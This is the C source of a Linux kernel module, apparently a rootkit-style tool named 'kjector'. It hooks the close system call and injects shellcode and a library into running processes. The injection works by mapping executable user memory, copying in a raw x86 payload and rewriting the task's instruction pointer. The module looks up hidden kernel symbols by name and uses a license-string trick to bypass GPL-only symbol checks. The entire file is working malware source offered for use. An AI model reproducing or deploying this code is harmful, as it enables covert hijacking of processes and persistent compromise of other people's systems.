#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched/mm.h>
#include <linux/mman.h>

#include "khook/khook/engine.c"

#ifndef NDEBUG
# define kjector_dbg(fmt, ...) do { printk("kjector[%s]: " fmt, current->comm, ##__VA_ARGS__); } while (0)
#else
# define kjector_dbg(fmt, ...) do {} while (0)
#endif

#ifndef BAD_ADDR
# define BAD_ADDR(x)		(unlikely((unsigned long)(x) >= TASK_SIZE))
#endif

#define KJECTOR_ACK_DONE	((unsigned)0xc1c1c1c1)
#define KJECTOR_ACK_REDO	((unsigned)0xc2c2c2c2)

////////////////////////////////////////////////////////////////////////////////

unsigned char __attribute__((weak)) payload[] = {
#ifdef PAYLOAD_IDLE_TRAP
	0xcc,					// int3
#endif
	0x9c,					// pushfq
	0x48, 0x89, 0xc1,			// movq %rax,%rcx
	0x48, 0xc1, 0xe9, 0x08,			// shrq $8,%rcx
	0x48, 0x25, 0xff, 0x00, 0x00, 0x00,	// andq $0xff,%rax
	0x48, 0xf7, 0xd8,			// negq %rax
	0x9d,					// popfq
	0xff, 0xe1,				// jmpq *%rcx
};

unsigned __attribute__((weak)) payload_len = sizeof(payload);

////////////////////////////////////////////////////////////////////////////////

typedef struct {
	const char *str, *lib;
} pmatch_t;

static const pmatch_t pmatch_tbl[] = {
	{ "ping", LIBKJECTOR }, // comment out to inject all processes
};

static const char *pmatch_task(struct task_struct *t) {
	int i = 0;
	const char *lib = NULL;
	for (i = 0; i < ARRAY_SIZE(pmatch_tbl); i++) {
		if (!strcmp(t->comm, pmatch_tbl[i].str)) {
			lib = pmatch_tbl[i].lib;
			break;
		}
	} return ARRAY_SIZE(pmatch_tbl) ? lib : LIBKJECTOR;
}

////////////////////////////////////////////////////////////////////////////////

typedef struct {
	struct mm_struct	*mm;
	struct pt_regs		*regs;
	unsigned long		*dataptr; // &mm->saved_auxv[AT_VECTOR_SIZE - 1]

	//
	// data-layout = { redo(16) | uptr(40) | lock(8) }
	//

#define KJECTOR_REDO_MAX	64

	unsigned long		d_uptr;
	unsigned long		d_redo;

} taskpriv_t;

static inline unsigned long __taskpriv_pack(taskpriv_t *p) {
	unsigned long v = 0;
	v |= p->d_uptr & 0x00007ffffffff000; // PAGE-aligned user space address mask
	v |= (p->d_redo & 0xffff) << 48;
	return v;
}

static inline unsigned long __taskpriv_unpack(taskpriv_t *p) {
	unsigned long v = p->dataptr[0];
	p->d_uptr = v & 0x00007ffffffff000; // PAGE-aligned user space address mask
	p->d_redo = (v >> 48) & 0xffff;
	return 0;
}

static long __taskpriv_get(taskpriv_t *p) {
	p->dataptr = &p->mm->saved_auxv[ AT_VECTOR_SIZE - 1 ]; // assign
	if (!__sync_val_compare_and_swap((char *)p->dataptr, 0, 1)) {
		return __taskpriv_unpack(p);
	} return -EBUSY;
}

static long taskpriv_get(taskpriv_t *p) {
	if ((p->mm = get_task_mm(current)) != NULL) {
		p->regs = task_pt_regs(current);
		if (__taskpriv_get(p))
			mmput(p->mm), p->mm = NULL;
	} return p->mm ? 0 : -EINVAL;
}

static void __taskpriv_put(taskpriv_t *p) {
	unsigned long v = 0;
	if (p->d_uptr) {
		v = __taskpriv_pack(p);
	} else v = 0xff; // lock forever
	__atomic_exchange_n(p->dataptr, v, __ATOMIC_RELAXED);
}

static void taskpriv_put(taskpriv_t *p) {
	BUG_ON(!p->mm);
	__taskpriv_put(p);
	mmput(p->mm);
}

////////////////////////////////////////////////////////////////////////////////

// mprotect wrapper to support old- and new-style calls
static long kjector_mprotect(unsigned long start, size_t len, unsigned long prot) {
	static long (*sys_mprotect)(unsigned long, size_t, unsigned long) = NULL;
	static long (*__x64_sys_mprotect)(struct pt_regs *) = NULL;

	if (sys_mprotect) {
		return sys_mprotect(start, len, prot);
	} else if (__x64_sys_mprotect) {
		struct pt_regs regs = { .di = (long)start, .si = (long)len, .dx = (long)prot };
		return __x64_sys_mprotect(&regs);
	} else {
		sys_mprotect = sys_mprotect ?: (void *)khook_lookup_name("sys_mprotect");
		__x64_sys_mprotect = __x64_sys_mprotect ?: (void *)khook_lookup_name("__x64_sys_mprotect");
	}

	return (sys_mprotect || __x64_sys_mprotect) ? 0 : -EIO;
}

// copy_to_user wrapper to avoid compile-time static size checks
static long kjector_copy_to_user(void *t, const void *f, unsigned long n) {
	static long (*copy_to)(void *, const void *, unsigned long);

	if (!copy_to) {
		copy_to = copy_to ?: (void *)khook_lookup_name("copy_to_user");
		copy_to = copy_to ?: (void *)khook_lookup_name("_copy_to_user");
		copy_to = copy_to ?: (void *)khook_lookup_name("__copy_to_user");
	} else {
		return copy_to(t, f, n);
	}

	return copy_to ? 0 : -EIO;
}

////////////////////////////////////////////////////////////////////////////////

static long kjector_try_lib(long res, const char *lib) {
	taskpriv_t t = { 0 };

	if (!taskpriv_get(&t)) {
		if (t.d_uptr == 0) { // brand new allocation
			size_t maplen = round_up(payload_len + strlen(lib) + 1, PAGE_SIZE);
			unsigned long map = vm_mmap(NULL, 0, maplen, PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0);
			if (!BAD_ADDR(map)) {
				kjector_dbg("vm_mmap - allocated %lu bytes (=%p)\n", maplen, (void *)map);
				if (!kjector_copy_to_user((void *)map, payload, payload_len) &&
				    !kjector_copy_to_user((void *)map + payload_len, lib, strlen(lib) + 1))
					if (!kjector_mprotect(map, maplen, PROT_READ|PROT_WRITE|PROT_EXEC))
						res = (t.regs->ip << 8) | (-res & 0xff), t.regs->ip = (t.d_uptr = map);
				if (!t.d_uptr)
					vm_munmap(map, maplen);
			} else {
				kjector_dbg("vm_mmap - failed\n");
				t.d_uptr = 0; // force-lock
			}
		} else if (t.d_redo & 0x8000) {
			res = (t.regs->ip << 8) | (-res & 0xff), t.regs->ip = t.d_uptr;
			t.d_redo &= ~0x8000; // clear redo flag
			kjector_dbg("redo\n");
		}
		taskpriv_put(&t);
	}

	return res;
}

static long kjector_try(long res) {
	const char *lib = pmatch_task(current);
	if (lib) res = kjector_try_lib(res, lib);
	return res;
}

static long kjector_ack(long what) {
	taskpriv_t t = { 0 };

	switch ((unsigned)what) {
	case KJECTOR_ACK_DONE:
		if (!taskpriv_get(&t)) {
			t.d_uptr = 0; // force-lock
			kjector_dbg("ack-done locked\n");
			taskpriv_put(&t);
		} return 1;
	case KJECTOR_ACK_REDO:
		if (!taskpriv_get(&t)) {
			if (KJECTOR_REDO_MAX && ((t.d_redo++ & 0x7fff) >= KJECTOR_REDO_MAX)) t.d_uptr = 0; // force-lock
			else t.d_redo |= 0x8000;
			kjector_dbg("ack-redo %04x/%u\n", (int)t.d_redo, KJECTOR_REDO_MAX);
			taskpriv_put(&t);
		} return 1;
	}

	return 0;
}

KHOOK_EXT(long, sys_close, unsigned int);
static long khook_sys_close(unsigned int fd) {
	long res = KHOOK_ORIGIN(sys_close, fd);
	if (!kjector_ack(fd)) {
		res = kjector_try(res);
	} return res;
}

KHOOK_EXT(long, __x64_sys_close, const struct pt_regs *);
static long khook___x64_sys_close(const struct pt_regs *regs) {
	long res = KHOOK_ORIGIN(__x64_sys_close, regs);
	if (!kjector_ack(regs->di)) {
		res = kjector_try(res);
	} return res;
}

int init_module(void) {
	kjector_dbg("payload:%s len:%u\n", PAYLOAD, payload_len);

	if (kjector_mprotect(-1, -1, -1) == -EIO) {
		kjector_dbg("mprotect wrapper initialization failed\n");
		return -EINVAL;
	}

	if (kjector_copy_to_user(NULL, NULL, 0) == -EIO) {
		kjector_dbg("copy_to_user wrapper initialization failed\n");
		return -EINVAL;
	}

	return khook_init();
}

void cleanup_module(void) {
	khook_cleanup();
}

MODULE_LICENSE("GPL\0but who really cares?");
